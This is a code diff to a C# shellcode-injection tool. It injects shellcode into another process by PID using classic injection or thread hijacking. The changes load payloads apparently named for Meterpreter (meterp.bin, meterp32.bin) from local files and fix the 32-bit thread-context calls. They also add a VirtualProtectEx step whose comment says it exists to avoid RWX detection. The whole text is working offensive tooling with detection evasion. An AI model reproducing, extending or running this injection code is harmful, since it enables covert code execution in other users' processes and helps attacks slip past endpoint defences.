@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using static CLRInjection.Enums;
 using static CLRInjection.DllImports;
+using System.IO;
 
 namespace ShellcodeTest
 {
@@ -20,7 +21,8 @@ namespace ShellcodeTest
             }
             Process proc = Process.GetProcessById(pid);
 
-            byte[] shellcode = new System.Net.WebClient().DownloadData("http://localhost/shellcode");
+            //byte[] shellcode = new System.Net.WebClient().DownloadData("http://localhost/shellcode");
+            byte[] shellcode = File.ReadAllBytes(@"C:\Users\Dev\Desktop\msgbox64.bin");
 
             IntPtr hProcess = GetProcessHandle(pid);
             
@@ -44,10 +46,14 @@ namespace ShellcodeTest
                 }
                 else if (args[0].ToLower() == "classic")
                 {
+                    shellcode = File.ReadAllBytes(@"C:\Users\Dev\Desktop\meterp.bin");
+                    //shellcode = File.ReadAllBytes(@"C:\Users\Dev\Desktop\msgbox64_classic.bin");
                     ShellcodeInjectClassic(shellcode, hProcess);
                 }
                 else if (args[0].ToLower() == "threadhijack")
                 {
+                    shellcode = File.ReadAllBytes(@"C:\Users\Dev\Desktop\meterp.bin");
+                    //shellcode = File.ReadAllBytes(@"C:\Users\Dev\Desktop\msgbox64_sneaky.bin");
                     // 64-bit only - add checks
                     ShellcodeInjectThreadHijack(shellcode, hProcess);
                 }
@@ -91,8 +97,6 @@ namespace ShellcodeTest
         /// <returns></returns>
         public static int ShellcodeInjectThreadHijack(byte[] shellcode, IntPtr hProcess)
         {
-          
-
             string arch;
             bool isTargetWow64;
             IsWow64Process(hProcess, out isTargetWow64);
@@ -106,6 +110,7 @@ namespace ShellcodeTest
             {
                 // Both processes are 32bit
                 arch = "x86";
+                shellcode = File.ReadAllBytes(@"C:\users\dev\desktop\meterp32.bin");
             }
             else
             {             
@@ -150,6 +155,11 @@ namespace ShellcodeTest
 
                 // Update the suspended thread's registers with the changed RIP address then execute the thread
                 SetThreadContext(hThread, ref context);
+
+                // Update the allocated permissions of the allocated memory to avoid RWX detection
+                uint oldProtect;
+                VirtualProtectEx(hProcess, allocMemAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+
                 ResumeThread(hThread);
             }
             else if (arch == "x86")
@@ -157,13 +167,18 @@ namespace ShellcodeTest
                 // Get the current registers for the suspended thread
                 CONTEXT context = new CONTEXT();
                 context.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_CONTROL;
-                GetThreadContext(hThread, ref context);
+                Wow64GetThreadContext(hThread, ref context);
 
                 // Update the RIP register to contain the address of the start of the shellcode
                 context.Eip = (uint)allocMemAddress.ToInt32();
 
                 // Update the suspended thread's registers with the changed RIP address then execute the thread
-                SetThreadContext(hThread, ref context);
+                Wow64SetThreadContext(hThread, ref context);
+
+                // Update the allocated permissions of the allocated memory to avoid RWX detection
+                uint oldProtect;
+                VirtualProtectEx(hProcess, allocMemAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+
                 ResumeThread(hThread);
             }
             return 0;
